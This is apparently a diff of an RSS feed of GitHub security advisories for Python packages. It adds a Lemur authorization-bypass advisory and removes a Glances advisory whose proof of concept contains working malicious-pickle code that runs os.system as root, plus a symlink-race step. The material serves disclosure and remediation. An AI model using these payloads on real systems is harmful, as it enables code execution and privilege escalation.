@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-06-25T18:39:26.398Z</updated>
+    <updated>2026-06-25T19:32:17.509Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,121 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[lemur] Lemur has an authorization bypass in StrictRolePermission / AuthorityCreatorPermission]]></title>
+        <id>https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</id>
+        <link href="https://github.com/advisories/GHSA-qcqw-jwxc-2hqg"/>
+        <updated>2026-06-25T18:48:39.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>StrictRolePermission</code> and <code>AuthorityCreatorPermission</code> in <code>lemur/auth/permissions.py</code> call <code>flask_principal.Permission.__init__()</code> with zero <code>Need</code>s when their config flags are unset. Both flags defaulted to <code>False</code> in code prior to the fix, so this was the state of any Lemur install that hadn't explicitly opted in.</p>
+<p>Flask-Principal's <code>Permission.allows()</code> returns <code>True</code> whenever <code>self.needs</code> is empty. The <code>.can()</code> gate therefore passes for every authenticated identity, including the lowest-privilege role Lemur ships (<code>read-only</code>).</p>
+<p>A user holding only <code>read-only</code> can create root Certificate Authorities, create and edit notifications (an SSRF sink), create domain entries, and upload arbitrary certificates. These classes are the sole authorization check on those endpoints.</p>
+<h2 id="root-cause">Root Cause</h2>
+<pre><code class="language-python"># lemur/auth/permissions.py
+class AuthorityCreatorPermission(Permission):
+    def __init__(self):
+        requires_admin = current_app.config.get("ADMIN_ONLY_AUTHORITY_CREATION", False)
+        if requires_admin:
+            super().__init__(RoleNeed("admin"))
+        else:
+            super().__init__()              # empty Need set
+
+class StrictRolePermission(Permission):
+    def __init__(self):
+        strict_role_enforcement = current_app.config.get("LEMUR_STRICT_ROLE_ENFORCEMENT", False)
+        if strict_role_enforcement:
+            needs = [RoleNeed("admin"), RoleNeed("operator")]
+            super().__init__(*needs)
+        else:
+            super().__init__()              # empty Need set
+</code></pre>
+<p><code>flask_principal.Permission.allows()</code> (upstream, v0.4.0):</p>
+<pre><code class="language-python">def allows(self, identity):
+    if self.needs and not self.needs.intersection(identity.provides):
+        return False
+    ...
+    return True
+</code></pre>
+<p>When <code>self.needs == set()</code>, the first guard is falsy and is skipped. <code>excludes</code> is also empty, so <code>allows()</code> returns <code>True</code> for any identity. <code>AuthenticatedResource</code> (the parent class for these views) sets <code>method_decorators = [login_required]</code>, which checks authentication only, no role. So the permission <code>.can()</code> is the only authorization layer in front of these endpoints.</p>
+<h2 id="affected-endpoints">Affected Endpoints</h2>
+<p>Views whose only authorization check is <code>StrictRolePermission().can()</code> or <code>AuthorityCreatorPermission().can()</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Path</th>
+<th>Source</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>POST</td>
+<td>/api/1/authorities</td>
+<td>lemur/authorities/views.py:231</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>/api/1/certificates/upload</td>
+<td>lemur/certificates/views.py:651</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>/api/1/pending_certificates/&lt;id&gt;/upload</td>
+<td>lemur/pending_certificates/views.py:545</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>/api/1/notifications</td>
+<td>lemur/notifications/views.py:227</td>
+</tr>
+<tr>
+<td>PUT/DEL</td>
+<td>/api/1/notifications/&lt;id&gt;</td>
+<td>lemur/notifications/views.py:370,384</td>
+</tr>
+<tr>
+<td>POST</td>
+<td>/api/1/domains</td>
+<td>lemur/domains/views.py:131</td>
+</tr>
+</tbody></table>
+<p><code>POST /api/1/authorities</code> is gated by <code>AuthorityCreatorPermission().can() and StrictRolePermission().can()</code>; both have empty Needs by default. The other rows are gated by <code>StrictRolePermission().can()</code> alone.</p>
+<p>Note on scope: <code>PUT /api/1/authorities/&lt;id&gt;</code> also references <code>StrictRolePermission</code>, but its gate is <code>AuthorityPermission(...).can() and StrictRolePermission().can()</code>. <code>AuthorityPermission</code> is constructed with non-empty Needs (<code>RoleNeed("admin")</code> plus authority-scoped needs), so that endpoint is not bypassable by a <code>read-only</code> user and is excluded from this report.</p>
+<h2 id="impact">Impact</h2>
+<p>A user holding only the <code>read-only</code> role can:</p>
+<ol>
+<li>Create root Certificate Authorities. CA cert and private key are persisted in Lemur's DB with the attacker as owner. Any internal trust store that pins Lemur-managed roots can now be signed against by the attacker.</li>
+<li>Upload arbitrary certificates via <code>/certificates/upload</code>, including attacker-supplied keys with destinations such as AWS push.</li>
+<li>Create or modify notifications, which reach an SSRF sink (see related finding F3, Slack notification webhook).</li>
+<li>Mark arbitrary domains as <code>sensitive</code>, manipulating Lemur's domain registry and the cert-issuance approval path.</li>
+</ol>
+<p>Combined with any low-privilege credential leak (phished employee, leaked SSO token) or insider access, this is a pivot from "any authenticated identity" to control of the PKI issuance plane.</p>
+<h2 id="remediation">Remediation</h2>
+<p>The config flag defaults for <code>ADMIN_ONLY_AUTHORITY_CREATION</code> and <code>LEMUR_STRICT_ROLE_ENFORCEMENT</code> were changed from <code>False</code> to <code>True</code>. Restrictive role enforcement is now active on all default installs without requiring explicit configuration.</p>
+<pre><code class="language-python">class AuthorityCreatorPermission(Permission):
+    def __init__(self):
+        requires_admin = current_app.config.get("ADMIN_ONLY_AUTHORITY_CREATION", True)
+        ...
+
+class StrictRolePermission(Permission):
+    def __init__(self):
+        strict_role_enforcement = current_app.config.get("LEMUR_STRICT_ROLE_ENFORCEMENT", True)
+        ...
+</code></pre>
+<p><strong>Note:</strong> The opt-out branches (empty Needs) remain in the code. Operators who explicitly set <code>ADMIN_ONLY_AUTHORITY_CREATION = False</code> or <code>LEMUR_STRICT_ROLE_ENFORCEMENT = False</code> in their config will reintroduce the bypass. These flags should be left unset or set to <code>True</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Netflix/lemur/security/advisories/GHSA-qcqw-jwxc-2hqg">https://github.com/Netflix/lemur/security/advisories/GHSA-qcqw-jwxc-2hqg</a></li>
+<li><a href="https://github.com/advisories/GHSA-qcqw-jwxc-2hqg">https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qcqw-jwxc-2hqg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-25T18:48:39.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[amazon-braket-sdk] amazon-braket-sdk vulnerable to Insecure Deserialization via pickle.loads()]]></title>
         <id>https://github.com/advisories/GHSA-g697-2xrc-gc46</id>
@@ -1637,165 +1752,5 @@ if acao:
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-22T21:27:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[glances] Glances has Insecure Pickle Deserialization in its Version Cache that Leads to Arbitrary Code Execution]]></title>
-        <id>https://github.com/advisories/GHSA-9837-48hr-q32j</id>
-        <link href="https://github.com/advisories/GHSA-9837-48hr-q32j"/>
-        <updated>2026-06-22T21:21:08.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>glances/outdated.py</code> uses <code>pickle.load()</code> to read a version-check cache file stored at a predictable, world-accessible path (<code>~/.cache/glances/glances-version.db</code> or <code>$XDG_CACHE_HOME/glances/glances-version.db</code>). No integrity check, signature verification, or format validation is performed before deserialization.  An attacker with write access to that path — through any of several realistic local or container-level scenarios — can plant a malicious pickle file and achieve arbitrary code execution as the OS user running Glances the next time it starts with version checking enabled (the default).</p>
-<hr>
-<h3 id="details">Details</h3>
-<p><strong>Affected file:</strong> <code>glances/outdated.py</code>, method <code>Outdated._load_cache()</code>, line 121</p>
-<p><strong>Direct URL (commit 04579778e733d705898a169e049dc84772c852da):</strong></p>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outdated.py#L121">https://github.com/nicolargo/glances/blob/04579778e733d705898a169e049dc84772c852da/glances/outdated.py#L121</a></li>
-</ul>
-<pre><code class="language-python"># outdated.py  (_load_cache, line 119-127)
-try:
-    with open(self.cache_file, 'rb') as f:
-        cached_data = pickle.load(f)          # ← no integrity check
-except Exception as e:
-    logger.debug(f"Cannot read version from cache file: {self.cache_file} ({e})")
-    ...
-</code></pre>
-<p><code>self.cache_file</code> is constructed from the XDG cache directory path at <code>Outdated.__init__()</code>:</p>
-<pre><code class="language-python"># outdated.py  (__init__)
-self.cache_file = os.path.join(
-    user_cache_dir('glances')[0],
-    'glances-version.db'
-)
-</code></pre>
-<p>On a default Linux installation this resolves to <code>/home/john/.cache/glances/glances-version.db</code> (or <code>/root/.cache/glances/…</code> when Glances runs as root).</p>
-<p>Python's <code>pickle</code> module is an execution-capable serialisation format: any class that implements <code>__reduce__</code> can embed an arbitrary callable and argument tuple that Python will invoke unconditionally at <code>pickle.load()</code> time.  There is no safe subset of pickle; the only safe mitigation is to not use it for untrusted data.</p>
-<p>The code was verified on x86_64 Linux, Python 3.13, Glances 4.5.5_dev1 (commit 04579778e733d705898a169e049dc84772c852da).  A malicious pickle crafted with <code>os.system()</code> via <code>__reduce__</code> executed the injected shell command successfully before the surrounding Python code raised a <code>TypeError</code>.</p>
-<hr>
-<h3 id="poc">PoC</h3>
-<p><strong>Special configuration required</strong></p>
-<p>No non-default Glances configuration is needed.  Version checking is enabled by default (<code>check_update = true</code>).  The only pre condition is that the attacker can write to the Glances user's XDG cache directory — see the attack scenarios below for how this arises in practice.</p>
-<hr>
-<p><strong>Attack scenario A — local privilege escalation (shared multi-user host)</strong></p>
-<p>Prerequisites: Glances runs periodically (e.g. via systemd or cron) as a privileged user (root or a dedicated monitoring account).  The attacker is an unprivileged local user who has write access to the Glances user's <code>~/.cache/glances/</code> directory (e.g. the directory or an ancestor is group- or world-writable, or was created with overly permissive umask).</p>
-<p><strong>Step 1 — Identify the cache path</strong></p>
-<pre><code class="language-bash">python3 -c "from glances.config import user_cache_dir; print(user_cache_dir()[0])"
-# Example output: /root/.cache/glances
-</code></pre>
-<p><strong>Step 2 — Craft and plant a malicious pickle</strong></p>
-<pre><code class="language-python">import pickle, os, pathlib
-
-class MaliciousPayload:
-    def __reduce__(self):
-        # This command runs as the Glances process user
-        cmd = 'id &gt;&gt; /tmp/glances_rce_proof.txt'
-        return (os.system, (cmd,))
-
-cache_dir  = pathlib.Path('/root/.cache/glances')   # adjust to target
-cache_file = cache_dir / 'glances-version.db'
-cache_dir.mkdir(parents=True, exist_ok=True)
-cache_file.write_bytes(pickle.dumps(MaliciousPayload()))
-print(f'Payload written to {cache_file}')
-</code></pre>
-<p><strong>Step 3 — Wait for Glances to start (or restart it)</strong></p>
-<p>Glances calls <code>_load_cache()</code> automatically at startup when <code>check_update = true</code> (the compiled-in default). No special configuration is required by the attacker.</p>
-<p><strong>Step 4 — Verify execution</strong></p>
-<pre><code class="language-bash">cat /tmp/glances_rce_proof.txt
-# uid=0(root) gid=0(root) groups=0(root)    ← output from the Glances-user context
-</code></pre>
-<hr>
-<p><strong>Attack scenario B — container / shared-volume poisoning</strong></p>
-<p>A compromised container that shares a Docker/Podman volume with the Glances container can write to the cache path on the shared volume. The next time Glances restarts (e.g. after a rolling update), the payload executes inside the Glances container with its privileges.</p>
-<hr>
-<p><strong>Attack scenario C — symlink race (TOCTOU)</strong></p>
-<p>Before the Glances cache directory is created for the first time (e.g. on a fresh installation), an attacker with write access to <code>~/.cache/</code> can create a symlink:</p>
-<pre><code class="language-bash">mkdir -p /home/john/.cache
-ln -s /tmp/attacker_controlled /home/john/.cache/glances
-</code></pre>
-<p>When Glances writes its legitimate cache file it writes instead to <code>/tmp/attacker_controlled/glances-version.db</code>, which the attacker can replace with the malicious pickle before the next start.</p>
-<hr>
-<p><strong>Minimal self-contained reproduction</strong></p>
-<pre><code class="language-python">import sys, os, pickle, pathlib, argparse
-
-sys.path.insert(0, '/path/to/glances')   # adjust to local clone
-
-FAKE_CACHE = pathlib.Path('/tmp/glances_test_cache')
-CACHE_FILE = FAKE_CACHE / 'glances-version.db'
-FAKE_CACHE.mkdir(parents=True, exist_ok=True)
-
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('echo RCE_confirmed &gt;&gt; /tmp/glances_rce.txt',))
-
-CACHE_FILE.write_bytes(pickle.dumps(Exploit()))
-
-# Reproduce the exact Glances code path
-from glances.outdated import Outdated
-obj = object.__new__(Outdated)
-obj.args = argparse.Namespace(disable_check_update=False, time=2)
-obj.data = {}
-obj.cache_file = str(CACHE_FILE)
-
-try:
-    obj._load_cache()            # pickle.load() fires here
-except Exception:
-    pass                         # expected: int not subscriptable
-
-import time; time.sleep(0.2)
-print(pathlib.Path('/tmp/glances_rce.txt').read_text())
-# Prints: RCE_confirmed
-</code></pre>
-<hr>
-<h3 id="impact">Impact</h3>
-<p><strong>Vulnerability type:</strong> Insecure Deserialization (CWE-502)</p>
-<p><strong>Who is impacted:</strong> Any system where Glances is run with version checking enabled (the default) in a shared environment where a less-privileged process can write to the Glances user's XDG cache directory, or in any containerised deployment using shared volumes.</p>
-<p><strong>Impact:</strong></p>
-<ul>
-<li><strong>Confidentiality:</strong> Full — the attacker gains code execution in the context of the Glances process and can read any data accessible to that user.</li>
-<li><strong>Integrity:</strong> Full — arbitrary commands can modify files, install persistence mechanisms, or alter system state.</li>
-<li><strong>Availability:</strong> Full — the Glances process and, if running as root, the system can be disrupted.</li>
-</ul>
-<p>On many deployments Glances is run as root (required to access hardware performance counters without specific capabilities), meaning successful exploitation yields full root code execution without any further privilege escalation step.</p>
-<hr>
-<h3 id="suggested-fix">Suggested Fix</h3>
-<p>Replace <code>pickle</code> with <code>json</code> for the version cache.  The data stored is a simple Python dictionary containing two string values and a <code>datetime</code> object; a JSON representation is straightforward:</p>
-<pre><code class="language-python">import json
-from datetime import datetime
-
-# Saving
-with open(self.cache_file, 'w', encoding='utf-8') as f:
-    json.dump({
-        'installed_version': self.installed_version(),
-        'latest_version':    latest,
-        'refresh_date':      datetime.now().isoformat(),
-    }, f)
-
-# Loading
-with open(self.cache_file, 'r', encoding='utf-8') as f:
-    cached_data = json.load(f)
-    cached_data['refresh_date'] = datetime.fromisoformat(cached_data['refresh_date'])
-</code></pre>
-<p>If pickle is retained for any reason, the cache file must be protected with an HMAC keyed from a Glances-managed secret (e.g. a random key stored in the Glances config directory, which should itself be mode 0600).</p>
-<p>As an additional hardening measure, restrict the permissions of the Glances cache directory to 0700 at creation time.</p>
-<hr>
-<h3 id="responsible-disclosure">Responsible Disclosure</h3>
-<p>The AFINE Team is committed to responsible / coordinated disclosure. The AFINE Team will not publish details of this vulnerability or release exploit code publicly until a fix has been released, or 90 days have elapsed from the date of this report, whichever comes first.</p>
-<hr>
-<h3 id="credits">Credits</h3>
-<p>This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.</p>
-<hr>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-9837-48hr-q32j">https://github.com/nicolargo/glances/security/advisories/GHSA-9837-48hr-q32j</a></li>
-<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.5">https://github.com/nicolargo/glances/releases/tag/v4.5.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-9837-48hr-q32j">https://github.com/advisories/GHSA-9837-48hr-q32j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9837-48hr-q32j</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-22T21:21:07.000Z</published>
     </entry>
 </feed>
